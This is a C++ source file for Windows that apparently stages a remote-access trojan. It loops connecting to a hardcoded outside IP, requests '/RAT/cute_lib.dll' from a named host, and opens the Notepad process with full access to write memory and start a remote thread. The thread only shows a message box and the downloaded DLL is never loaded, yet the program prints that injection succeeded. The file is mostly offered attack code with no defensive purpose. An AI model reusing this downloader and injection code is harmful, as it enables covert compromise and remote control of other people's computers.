//cl /EHsc .\inject_and_dl.cpp .\MemoryModule.c /link ws2_32.lib user32.lib kernel32.lib /OUT:inject_and_dl.exe
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <mutex>
#include <sstream>
#include <vector>
#include <algorithm>
#include <psapi.h>
#include <fstream>
#include <tlhelp32.h>
#include "MemoryModule.h"

using namespace std;
#pragma comment(lib, "ws2_32.lib")

SOCKET sock;
std::mutex socketMutex;

void safe_closesocket(SOCKET &clientSocket);
bool socket_setup(SOCKET &clientSocket);

void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename);

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef string (*RecvDataFunc)(const std::string&);
typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);

SendDataFunc send_data_dll;
RecvDataFunc receive_data_dll;
RecvDataRawFunc receive_data_raw_dll;

int main()
{
    if (!socket_setup(sock))
    {
        cerr << "Socket setup failed." << endl;
        return 1;
    }

    vector<unsigned char> data;

    data = receive_data(sock, "cute_lib.dll");


    DWORD processId = 0;
    HWND hwnd = FindWindowA(NULL, "Untitled - Notepad");
    if (hwnd == NULL)
    {
        std::cerr << "Could not find the target window.\n";
        return 1;
    }
    GetWindowThreadProcessId(hwnd, &processId);
    if (processId == 0)
    {
        std::cerr << "Could not get the process ID.\n";
        return 1;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL)
    {
        std::cerr << "Could not open the target process.\n";
        return 1;
    }

    // Allocate memory in the target process for the message box text
    const char *message = "Hello from injected code!";
    LPVOID pRemoteMessage = VirtualAllocEx(hProcess, NULL, strlen(message) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteMessage == NULL)
    {
        std::cerr << "Could not allocate memory in the target process.\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Write the message to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMessage, message, strlen(message) + 1, NULL))
    {
        std::cerr << "Could not write to the allocated memory in the target process.\n";
        VirtualFreeEx(hProcess, pRemoteMessage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread to call MessageBoxA in the target process
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, pRemoteMessage, MB_OK | MB_ICONINFORMATION, NULL);
    if (hThread == NULL)
    {
        std::cerr << "Could not create the remote thread.\n";
        VirtualFreeEx(hProcess, pRemoteMessage, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemoteMessage, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL injected and loaded successfully.\n";

    return 0;
}


bool socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    connected = false;
    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            //std::cout << "Connected to the server!\n";
            connected = true;
        }
    }
    return true;
}

void safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        
        clientSocket = INVALID_SOCKET;
    }
}

vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename)
{
    lock_guard<mutex> lock1(socketMutex);

    socket_setup(clientSocket);

    // Send HTTP GET request
    string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: close\r\n\r\n";

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        throw std::runtime_error("Send failed");
    }

    // Receive data in chunks
    char buffer[8192]; // Increased buffer size
    vector<unsigned char> receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
        } else if (bytesReceived == 0) {
            //cerr << "Connection closed by server." << endl;
            break;
        } else {
            int error = WSAGetLastError();
            cerr << "Receive failed with error: " << error << endl;
            break;
        }
    } while (bytesReceived > 0);

    // Ensure header separator is found
    size_t headerEnd = 0;
    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

    // Search for header separator (CRLF + CRLF)
    for (size_t i = 0; i < receivedData.size() - 3; ++i)
    {
        if (receivedData[i] == CRLF[0] &&
            receivedData[i + 1] == CRLF[1] &&
            receivedData[i + 2] == CRLF[2] &&
            receivedData[i + 3] == CRLF[3])
        {
            headerEnd = i + 4; // Found header, skip the separator
            break;
        }
    }

    if (headerEnd != 0)
    {
        //cout << "Header found at position: " << headerEnd << endl;
    }
    else
    {
        cerr << "Header separator not found." << endl;
        throw std::runtime_error("Header separator not found");
    }

    // Make sure headerEnd + 4 is within the bounds of the receivedData
    if (headerEnd < receivedData.size())
    {
        // Extract body after header (start from headerEnd)
        vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
        safe_closesocket(clientSocket); // Close the socket safely

        return body; // Return the extracted body
    }
    else
    {
        cerr << "Body extraction failed: headerEnd exceeds receivedData size." << endl;
        safe_closesocket(clientSocket); // Close the socket safely
        throw std::runtime_error("Body extraction failed");
    }
}